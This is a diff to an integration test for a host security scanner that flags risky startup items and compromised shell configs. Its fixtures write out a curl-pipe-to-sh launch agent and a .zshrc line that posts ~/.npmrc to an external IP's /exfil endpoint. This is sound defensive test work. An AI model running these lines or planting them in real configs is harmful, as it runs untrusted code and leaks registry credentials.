@@ -152,6 +152,12 @@ describe("host scan integration", () => {
       "<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://x/i | sh</string></array>",
       new Date("2025-01-01"),
     );
+    put(
+      home,
+      "LA/com.apple.updater.plist",
+      "<key>Label</key><string>com.apple.updater</string><key>Program</key><string>/usr/local/bin/u</string>",
+      new Date("2025-01-01"),
+    );
     put(home, "LA/com.fine.plist", "<key>Program</key><string>/usr/bin/true</string>", new Date("2025-01-01"));
     put(home, ".zshrc", "export X=1\ncurl http://194.150.166.244:8080/exfil -d @~/.npmrc\n");
     const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [la], skipLive: true, now: NOW });
@@ -159,7 +165,8 @@ describe("host scan integration", () => {
     expect(t.some((x) => x.startsWith("suspicious: Risky startup item com.update.plist") && x.includes("downloads and runs a script"))).toBe(true);
     expect(t.some((x) => x.includes("com.fine.plist"))).toBe(false);
     expect(t.some((x) => x.startsWith("compromised:") && x.includes(".zshrc line 2"))).toBe(true);
-    expect(r.inventory.startupItems).toHaveLength(2);
+    expect(t.some((x) => x.includes("com.apple.updater.plist") && x.includes("named like an Apple service"))).toBe(true);
+    expect(r.inventory.startupItems).toHaveLength(3);
   });
 
   it("an exact file name whose campaign publishes hashes needs the hash; a wildcard dropper name does not", async () => {
